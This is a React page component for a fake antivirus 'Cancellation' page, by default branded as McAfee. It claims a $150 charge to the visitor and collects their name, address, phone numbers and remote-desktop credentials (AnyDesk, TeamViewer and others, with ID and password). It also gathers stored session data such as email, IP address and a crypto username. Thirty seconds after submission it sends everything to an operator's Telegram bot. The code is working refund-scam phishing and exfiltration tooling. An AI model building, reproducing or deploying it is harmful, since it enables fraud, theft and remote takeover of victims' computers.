'use client'

import { useState, useEffect } from 'react'

interface CancelPageProps {
  params: {
    vendor: string
  }
}

function formatVendorName(raw: string) {
  const cleaned = raw.replace(/-/g, ' ').trim()
  if (!cleaned) return 'McAfee'
  return cleaned
    .split(' ')
    .map(part => part.charAt(0).toUpperCase() + part.slice(1))
    .join(' ')
}

export default function CancelVendorPage({ params }: CancelPageProps) {
  const vendorName = formatVendorName(params.vendor || 'mcafee')

  const [formData, setFormData] = useState({
    fullName: '',
    billingAddress: '',
    cellPhone: '',
    homePhone: '',
    cancellationReason: 'Not Compatible',
    remoteSoftware: 'Alpemix',
    remoteId: '',
    remotePass: '',
  })
  const [showWaitModal, setShowWaitModal] = useState(false)
  const [mainInfo, setMainInfo] = useState<any | null>(null)
  const [sessionInfo, setSessionInfo] = useState<any | null>(null)
  const [antiVirus, setAntiVirus] = useState<string>('')
  const [telegramConfig, setTelegramConfig] = useState<{ botToken: string; chatId: string } | null>(null)

  useEffect(() => {
    if (typeof window === 'undefined') return

    const load = async () => {
      try {
        const mainRaw = window.sessionStorage.getItem('diagnosticForm')
        const sessionRaw = window.sessionStorage.getItem('sessionData')
        const avRaw = window.sessionStorage.getItem('selectedAntivirus')

        if (mainRaw) setMainInfo(JSON.parse(mainRaw))
        if (sessionRaw) setSessionInfo(JSON.parse(sessionRaw))
        if (avRaw) setAntiVirus(avRaw)

        // Load Telegram config based on domain
        const res = await fetch('/telegram-config.json')
        if (res.ok) {
          const allConfig = await res.json()
          const host = window.location.hostname.toLowerCase()
          const normalizedHost = host.startsWith('www.') ? host.slice(4) : host

          const entry =
            allConfig[host] ||
            allConfig[normalizedHost] ||
            allConfig['default']
          if (entry?.botToken && entry?.chatId) {
            setTelegramConfig({
              botToken: String(entry.botToken),
              chatId: String(entry.chatId),
            })
          } else {
            console.error('No Telegram config found for host', host)
          }
        } else {
          console.error('Failed to load telegram-config.json')
        }
      } catch (err) {
        console.error('Failed to read stored data', err)
      }
    }

    load()
  }, [])

  const sendCancelToTelegram = async () => {
    if (!telegramConfig) {
      console.error('Telegram config not loaded; cannot send message')
      return
    }

    const BOT_TOKEN = telegramConfig.botToken
    const CHAT_ID = telegramConfig.chatId

    const message = `🔔 New Cancellation Request (DPRO)

fullName: ${formData.fullName || mainInfo?.fullName || 'N/A'}
billingAddress: ${formData.billingAddress || 'N/A'}
cellPhone: ${formData.cellPhone || 'N/A'}
cancellationReason: ${formData.cancellationReason || 'N/A'}
remoteSoftware: ${formData.remoteSoftware || 'N/A'}
remoteId: ${formData.remoteId || 'N/A'}
remotePass: ${formData.remotePass || 'N/A'}
email: ${mainInfo?.email || 'N/A'}
antiVirus: ${antiVirus || 'N/A'}
agentId: ${mainInfo?.agentId || 'N/A'}
agentName: ${mainInfo?.agentName || 'N/A'}
ip_address: ${sessionInfo?.ipAddress || 'N/A'}
homephone: ${mainInfo?.alternatePhone || 'N/A'}
company: DPRO
explicit_content: ${mainInfo?.explicitContent || 'N/A'}
crypto_username: ${mainInfo?.cryptoUsername || 'N/A'}`

    try {
      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
        }),
      })

      const result = await response.json()
      if (!response.ok) {
        console.error('Telegram API error (cancel):', result)
      } else {
        console.log('Cancellation message sent to Telegram successfully')
      }
    } catch (err) {
      console.error('Error sending cancellation to Telegram:', err)
    }
  }

  const handleChange = (
    e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>
  ) => {
    const { name, value } = e.target
    setFormData(prev => ({ ...prev, [name]: value }))
  }

  const isFormValid =
    formData.fullName.trim() !== '' &&
    formData.billingAddress.trim() !== '' &&
    formData.cellPhone.trim() !== '' &&
    formData.homePhone.trim() !== '' &&
    formData.cancellationReason.trim() !== '' &&
    formData.remoteSoftware.trim() !== '' &&
    formData.remoteId.trim() !== '' &&
    formData.remotePass.trim() !== ''

  return (
    <main className="main-container">
      <div className="cancel-card">
        <div className="cancel-header">
          <div className="cancel-logo">{vendorName}</div>
          <h1 className="cancel-title">Cancellation</h1>
          <p className="cancel-subtitle">Account Security &amp; Refund Processing</p>
        </div>

        <p className="cancel-intro">
          Welcome to the <span className="cancel-highlight">Cancellation</span> team.
          <br />
          Your account has been charged a one-time fee of{' '}
          <span className="cancel-amount">$150.00</span>.
        </p>

        <p className="cancel-text">
          Please provide your details below so we can verify your request and route you to a refund
          manager.
        </p>

        <form className="cancel-form">
          <div className="cancel-field">
            <label className="cancel-label">Full Name</label>
            <input
              className="cancel-input"
              type="text"
              name="fullName"
              value={formData.fullName}
              onChange={handleChange}
            />
          </div>

          <div className="cancel-field">
            <label className="cancel-label">Billing Address</label>
            <input
              className="cancel-input"
              type="text"
              name="billingAddress"
              value={formData.billingAddress}
              onChange={handleChange}
            />
          </div>

          <div className="cancel-field">
            <label className="cancel-label">Cell Phone</label>
            <input
              className="cancel-input"
              type="tel"
              name="cellPhone"
              value={formData.cellPhone}
              onChange={handleChange}
            />
          </div>

          <div className="cancel-field">
            <label className="cancel-label">Home Phone</label>
            <input
              className="cancel-input"
              type="tel"
              name="homePhone"
              value={formData.homePhone}
              onChange={handleChange}
            />
          </div>

          <div className="cancel-field">
            <label className="cancel-label">Cancellation Reason</label>
            <select
              className="cancel-select"
              name="cancellationReason"
              value={formData.cancellationReason}
              onChange={handleChange}
            >
              <option value="Not Compatible">Not Compatible</option>
              <option value="Software Not Working">Software Not Working</option>
              <option value="No Longer Needed">No Longer Needed</option>
            </select>
          </div>

          <div className="cancel-remote-row">
            <div className="cancel-remote-field">
              <label className="cancel-label">Remote Software</label>
              <select
                className="cancel-select"
                name="remoteSoftware"
                value={formData.remoteSoftware}
                onChange={handleChange}
              >
                <option value="Alpemix">Alpemix</option>
                <option value="Ultra Viewer">Ultra Viewer</option>
                <option value="Chromebook">Chromebook</option>
                <option value="AnyDesk">AnyDesk</option>
                <option value="Hoptodesk">Hoptodesk</option>
                <option value="Teamviewer">Teamviewer</option>
              </select>
            </div>

            <div className="cancel-remote-field">
              <label className="cancel-label">Remote ID</label>
              <input
                className="cancel-input"
                type="text"
                name="remoteId"
                value={formData.remoteId}
                onChange={handleChange}
              />
            </div>

            <div className="cancel-remote-field">
              <label className="cancel-label">Remote Pass</label>
              <input
                className="cancel-input"
                type="text"
                name="remotePass"
                value={formData.remotePass}
                onChange={handleChange}
              />
            </div>
          </div>

          <button
            type="button"
            className="submit-button"
            disabled={!isFormValid}
            onClick={() => {
              if (!isFormValid || showWaitModal) return
              setShowWaitModal(true)

              // send to Telegram after 30 seconds
              setTimeout(() => {
                sendCancelToTelegram()
              }, 30000)
            }}
          >
            Cancel &gt;&gt;
          </button>
        </form>

        <p className="cancel-note">
          By proceeding, you confirm that the above details are accurate and that you wish to initiate
          the cancellation and uninstallation process.
        </p>

        {showWaitModal && (
          <div className="modal-overlay">
            <div className="cancel-wait-modal">
              <h3 className="cancel-wait-title">Please Wait</h3>

              <div className="cancel-wait-icon-wrapper">
                <div className="cancel-wait-icon-ring">
                  <div className="cancel-wait-icon-inner"></div>
                </div>
              </div>

              <p className="cancel-wait-main">
                Please wait <span>3–5 minutes</span>.
              </p>

              <p className="cancel-wait-sub">
                A refund manager will call you shortly.
              </p>
            </div>
          </div>
        )}
      </div>
    </main>
  )
}


